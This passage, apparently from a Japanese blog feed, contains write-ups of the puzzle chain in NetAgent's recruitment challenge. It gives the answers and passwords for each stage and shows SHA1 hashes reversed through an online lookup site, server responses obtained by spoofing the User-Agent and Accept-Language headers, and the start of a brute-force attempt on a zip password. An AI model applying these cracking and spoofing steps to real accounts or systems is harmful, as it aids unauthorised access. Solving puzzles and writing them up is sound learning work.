</span></code></pre></td></tr></table></div></figure>


<p>あっさりと展開でき、QRcodeという名のファイルが出てきました。
このファイルの形式はSun raster image dataとのことです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file QRcode
</span><span class='line'>QRcode: Sun raster image data, <span class="m">123</span> x 123, 8-bit, RGB colormap
</span></code></pre></td></tr></table></div></figure>


<p>画像データらしいですが、開けるアプリケーションを持ち合わせていないので、ImageMagickに投げ込んでみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>convert QRcode qrcode.png
</span><span class='line'><span class="nv">$ </span>file qrcode.png
</span><span class='line'>qrcode.png: PNG image data, <span class="m">123</span> x 123, 4-bit grayscale, non-interlaced
</span></code></pre></td></tr></table></div></figure>


<p>さすがImageMagick難なく変換できたすごい！
簡単に開ける形式の画像ファイルができたので開いてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/qrcode.png" alt="qrcode.png" /></p>

<p><a href="http://mzyy94.com/blog/2014/12/07/seccon2014-online/">半分食べられてしまったパンケーキ</a>ではなく、普通のQRコードでした。</p>

<p>適当なQRコードリーダーで読み込むと、以下のような文字列が得られます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>+BCcENQQxBEMEQAQwBEgEOgQw-
</span></code></pre></td></tr></table></div></figure>


<p>+で始まり-で終わる文字列、そう、UTF-7エンコード文字列です。
+と-の間はUTF-16のBASE64エンコード文字列（ただしパッディングの=が省略されている）なので、<code>nkf</code>で変換してみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo </span>BCcENQQxBEMEQAQwBEgEOgQw <span class="p">|</span> nkf -mB -W16B
</span></code></pre></td></tr></table></div></figure>




<!--
Чебурашка
-->


<p>何やらロシア語らしきものが出てきます。意味を調べると、ロシアの絵本のキャラクターとのことです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/Cheburashka.jpg" alt="Cheburashka.jpg" /></p>

<p>これ以上解くものがなくなったので、これがmondai5の答えのようです。しかし<code>7z</code>コマンドで解凍を試みても、パスワードが違うと言われる始末です。</p>

<p>p7zipの<code>7z</code>コマンドによる非ASCII文字パスワード付き7zipの解凍・圧縮は、環境によって正しく処理されないということを、以前日本語パスワードをセットしたときに経験したのを思い出し、本家7zipの<code>7z.exe</code>を使って解凍をしてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>wine 7z.exe x mondai6.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai6.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint6.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai6.txt
</span><span class='line'>Extracting  mondai7.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70362410
</span><span class='line'>Compressed: 70373511
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.046 <span class="o">=</span>    1%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     0.780 <span class="o">=</span>   17%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     0.826 <span class="o">=</span>   18%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     4.394 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z.exe x mondai6.zip -pЧебурашка

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai6.zip

Extracting  hint6.txt
Extracting  mondai6.txt
Extracting  mondai7.zip

Everything is Ok

Files: 3
Size:       70362410
Compressed: 70373511

Kernel  Time =     0.046 =    5%
User    Time =     0.811 =   89%
Process Time =     0.858 =   94%    Virtual  Memory =      2 MB
Global  Time =     0.909 =  100%    Physical Memory =      4 MB
-->


<p>解凍できました！（やっと終わった。。）</p>

<h1>mondai6</h1>

<p>mondai6.txtには以下のように記載がありました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span></code></pre></td></tr></table></div></figure>


<p>実際にこのURLにアクセスしに行くと、次のようなレスポンスを得られました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.37.1
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:20:21 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'><span class="o">{</span> <span class="o">[</span>data not shown<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;use R4000
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>なにやらR4000を使えとの文字だけが返ってきました。
R4000でGoogle検索すると、MIPSのプロセッサ情報がいくつか引っかかります。
MIPS R4000を搭載したデバイスでアクセスすればいいのかな？と思ったので、
Googleで「MIPS R4000 デバイス」で検索し、MIPS R4000搭載のデバイスを探してみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/14/mips-r4000-search.png" alt="mips-r4000-search.png" /></p>

<p>検索結果1ページ目によると、PSPに搭載されているとの情報がいくつかヒットしていました。
早速PSPのブラウザからアクセスする際に送られるUser-Agentを調べてみます。</p>

<p><a href="http://www.openspc2.org/userAgent/">userAgent一覧/ユーザーエージェント一覧</a></p>

<p>このサイトによると、PSPのUAは、</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>となっているようです。</p>

<p>早速このUAで先ほどのURLにアクセスしてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v -A <span class="s1">&#39;Mozilla/4.0 (PSP PlayStation Portable); 2.00)&#39;</span> http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:31:47 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Content-Length: 42
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;de la Bucure?ti
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>レスポンスが変わりました。知らない国の言葉で書かれていたのでGoogle翻訳にタイプしてみると、ルーマニア語であるとの情報を得ました。</p>

<p>先ほどのレスポンスの一部文字が&#8221;?&#8221;となっているので、ルーマニア語を許容するヘッダーを付加すると表示が変わるかもしれないと思い、Accept-Languageにルーマニア語を指定してアクセスしてみました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>curl -v -H <span class="s1">&#39;Accept-Language: ro-RO&#39;</span> -A <span class="s1">&#39;Mozilla/4.0 (PSP PlayStation Portable); 2.00)&#39;</span> http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 49.212.84.208...
</span><span class='line'>* Connected to 49.212.84.208 <span class="o">(</span>49.212.84.208<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
</span><span class='line'>&gt; User-Agent: Mozilla/4.0 <span class="o">(</span>PSP PlayStation Portable<span class="o">)</span><span class="p">;</span> 2.00<span class="o">)</span>
</span><span class='line'>&gt; Host: 49.212.84.208
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Accept-Language: ro-RO
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; Date: Tue, <span class="m">07</span> Apr <span class="m">2015</span> 08:35:33 GMT
</span><span class='line'>* Server Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span> is not blacklisted
</span><span class='line'>&lt; Server: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span><span class='line'>&lt;
</span><span class='line'>* Closing connection 0
</span><span class='line'>&lt;HTML&gt;&lt;BODY&gt;key: Minesweeper1990
</span><span class='line'>&lt;/BODY&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>表示が変わり、mondai6の答えが出てきました。mondai7.zipのパスワードに指定して解凍してmondai6はおしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai7.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai7.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint7.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.zip
</span><span class='line'>Extracting  normal.exe
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70383731
</span><span class='line'>Compressed: 70362268
</span></code></pre></td></tr></table></div></figure>




<!--
$ 7z x mondai7.zip -pMinesweeper1990

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai7.zip

Extracting  hint7.txt
Extracting  mondai8.zip
Extracting  normal.exe

Everything is Ok

Files: 3
Size:       70383731
Compressed: 70362268
-->


<p>明日はmondai7からmondai9までのWrite-upを公開する予定です。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その1]]></title>
    <link href="http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4/"/>
    <updated>2015-04-13T14:08:49+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4</id>
    <content type="html"><![CDATA[<p>恒例のネットエージェントのいきなり最終面接問題が3月末に公開されました。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>ネットニュースサイトにも取り上げられ（<a href="http://nlab.itmedia.co.jp/nl/articles/1503/30/news143.html">「解けたらいきなり最終面接」 ネットエージェント、今年も新卒向けに“難問”出題 - ねとらぼ</a>）、盛り上がりを見せていたあのmondaiです。
2016年新卒として、書類審査や2次選考を飛ばして最終面接を受けられるということなので本腰を入れて取り組んでみました。
このいきなり最終面接問題に関しては、全問正解しなければ回答の公開をしてはいけないとのことだったので察しがつくと思いますが、なんとかすべての問題をクリアできました。
これらmondaiを解いてきた過程をWrite-upとして残すことにしたので、興味がある方はご覧ください。</p>

<p>この記事ではmondai1からmondai4までの回答を掲載しています。</p>

<!-- more -->


<h1>mondai1</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>選考過程を縮めたい方に問題を用意いたしました。問題に答えると最終面接から始められます。 
</span><span class='line'>※２０１６年３月卒業予定の方以外も挑戦していただけますが、採用対象とはなりません。
</span><span class='line'>問題：LzYxMDIvcGouaGJwLy86cHR0aA==
</span></code></pre></td></tr></table></div></figure>


<p>BASE64でエンコードされた文字列を渡されるので、ちょちょっとコマンドを打つと逆さまになったURLがでてきます。</p>

<p>なので<code>rev</code>コマンドを噛ませて逆順にしてアクセス可能なURLが表示されたらmondai1はおしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo </span><span class="nv">LzYxMDIvcGouaGJwLy86cHR0aA</span><span class="o">==</span> <span class="p">|</span> base64 -D <span class="p">|</span> rev
</span></code></pre></td></tr></table></div></figure>


<!--
http://pbh.jp/2016/
-->


<h1>modai2</h1>

<p>mondai1の答えのURLにアクセスするとzip圧縮されたファイルを入手でき、そのファイルを展開するとmondai2.txtとzip形式の圧縮ファイルがあります。mondai2.txtの内容は以下の通りでした。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>2016の平方根の小数点以下2016桁目から20桁をパスワードにしました。
</span></code></pre></td></tr></table></div></figure>


<p>大きな有効数字の平方根を扱えるコマンドが*nix系システムには存在します。そう<code>bc</code>コマンドです。</p>

<p>この<code>bc</code>コマンドを用いて小数点以下2035桁(2015番目から20桁)の2016の平方根を計算させます。
<code>bc</code>コマンドによる出力は、適当な桁数で折り返しがあるので<code>perl</code>の正規表現を用いて削り、<code>tail</code>で終端から20バイトを取り出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;scale=2015+20;sqrt(2016)&#39;</span> <span class="p">|</span> bc <span class="p">|</span> perl -pe<span class="s1">&#39;s/\\?\n//&#39;</span> <span class="p">|</span> tail -c20
</span></code></pre></td></tr></table></div></figure>




<!--
74571026133060730881
-->


<p>これをパスワードとして入力すればmondai3.zipを解凍できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai3.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai3.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint3.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai3.txt
</span><span class='line'>Extracting  mondai4.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70392202
</span><span class='line'>Compressed: 70392736
</span></code></pre></td></tr></table></div></figure>




<!--

$ 7za x mondai3.zip -p74571026133060730881

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai3.zip

Extracting  hint3.txt
Extracting  mondai3.txt
Extracting  mondai4.zip

Everything is Ok

Files: 3
Size:       70392202
Compressed: 70392736

-->


<h1>mondai3</h1>

<p>mondai3.txtの中身は以下の通り。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ハッシュパスワード問題
</span><span class='line'>答え：３つの答えをつなげて
</span><span class='line'>
</span><span class='line'>0f1aae8b8398c20f81e1c36e349a7880c9234c63
</span><span class='line'>01821f5469967540a5a774197463e8c4d658f588
</span><span class='line'>264f39cab871e4cfd65b3a002f7255888bb5ed97
</span></code></pre></td></tr></table></div></figure>


<p>パスワードを3つに分割してSHA1ハッシュを生成したものが記されており、それらの元の文字列を探し出せばいいというもの。広いWebの世界には単純な単語のハッシュ化前後のテーブルが存在し、手軽に利用できるものに
<a href="http://www.hashkiller.co.uk/sha1-decrypter.aspx">SHA1 Decrypter - SHA1 Decryption, Free SHA1 Decryptor, Online SHA1 Cracker, SHA1 Security</a>などがあります。このサイトに問題のハッシュ値をペーストして探索をかけると1秒足らずでハッシュ化前の数値を返してくれます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/hashkiller.png" alt="hashkiller.png" /></p>

<p>ここで得られた単語をそのままくっつけてパスワードに指定すると、mondai4.zipが解凍できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai4.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai4.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint4.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai4.png
</span><span class='line'>Extracting  mondai5.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70391846
</span><span class='line'>Compressed: 70391891
</span></code></pre></td></tr></table></div></figure>




<!--
$ 7za x mondai4.zip -ptokyouenoline

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai4.zip

Extracting  hint4.txt
Extracting  mondai4.png
Extracting  mondai5.zip

Everything is Ok

Files: 3
Size:       70391846
Compressed: 70391891

-->


<h1>mondai4</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/mondai4.png" alt="mondai4.png" />
mondai4.pngはヒエログリフが書かれた画像です。ヒエログリフを読解できなければ問題文すら読めない状況なので、ヒエログリフ学習サイトを探して学びます。以下のサイトを参考に3分ほどで学びました。</p>

<ul>
<li><a href="http://www004.upp.so-net.ne.jp/anubis/j50/jp50.html">日本語五十音をヒエログリフで表現</a></li>
</ul>


<p>ヒエログリフを学び終わると、すらすらと画像の文字が読めるようになるので、日本語に起こします。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>のらかちいくち　てちのちんちもちみら　もにみちもにみら　もにとちのにみちもちい　のらもらま
</span></code></pre></td></tr></table></div></figure>


<p>ぱっと見で平仮名で換字式暗号化された英文もしくはローマ字の文だと想像がつきます。ここで適当な文節として二言目の「てちのちんちもちみら」をGoogleで検索してみると、上位にヒットしたものにこの暗号の手がかりがでてきます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/techinochi-search.png" alt="techinochi-search.png" /></p>

<p>日本語キーボードのかな入力モードにしてローマ字の文を打った文は、母音に位置する「ら」や「ち」が多く登場することから、この暗号方式はカナ入力のままのローマ字打ちだと断定しました。
しかし英字キーボードユーザーなので、かなが印刷されたキーボードを持っていません。仕方なしにWikimediaでそれっぽい画像を拾ってきて、平仮名⇆アルファベット変換を行うと、上記の平仮名文字列は以下のように変換できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>kotaeha wakayamano minamino misakinamae komoji
</span></code></pre></td></tr></table></div></figure>


<p>「答えは和歌山の南の岬名前小文字」とのことです。早速Googleマップを開いて和歌山県の南にある岬を探します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/13/wakayama-map.png" alt="wakayama-map.png" /></p>

<p>探すと潮岬（読み：しおのみさき）が和歌山の南部にある岬なので、これをアルファベット小文字にしてパスワードにして回答終了…だとおもってました。
<strong>shionomisaki</strong>としてタイプしてもパスワードが間違っていると言われ、解凍できません。「もしや違う岬なのかな？」と思い、和歌山の岬をいろいろ調べて同じように入力しても開きません。もうだめ&#8230;と心折れそうになってしまったので、あとはBruteForceに任せようと、次のような適当なスクリプトを書いて放置しました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
